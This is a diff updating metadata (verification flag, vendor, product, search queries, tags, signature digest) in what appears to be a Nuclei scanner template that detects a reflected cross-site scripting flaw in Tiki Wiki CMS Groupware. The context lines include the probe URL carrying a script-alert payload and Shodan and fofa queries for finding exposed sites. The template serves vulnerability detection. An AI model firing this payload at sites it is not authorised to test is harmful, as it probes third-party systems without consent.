@@ -9,9 +9,13 @@ info:
   reference:
     - https://packetstormsecurity.com/files/170446/Tiki-Wiki-CMS-Groupware-25.0-Cross-Site-Scripting.html
   metadata:
+    verified: true
+    max-request: 2
     shodan-query: http.html:"tiki wiki"
-    verified: "true"
-  tags: edb,xss,tikiwiki,packetstorm,acketstorm
+    product: tikiwiki_cms\/groupware
+    vendor: tiki
+    fofa-query: body="tiki wiki"
+  tags: edb,xss,tikiwiki,packetstorm,vuln
 
 http:
   - method: GET
@@ -20,6 +24,7 @@ http:
       - "{{BaseURL}}/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>"
 
     stop-at-first-match: true
+
     matchers-condition: and
     matchers:
       - type: word
@@ -37,3 +42,4 @@ http:
       - type: status
         status:
           - 403
+# digest: 4b0a00483046022100f03064a00be782642e014eea2d381a0684cc2fa02ec6b130df98da55cb4ccbe302210082652d86a5f7104e528b90512d0aedf9c1fdea01280414fe326cc2085d5826dd:922c64590222798bb761d5b6d8e72950
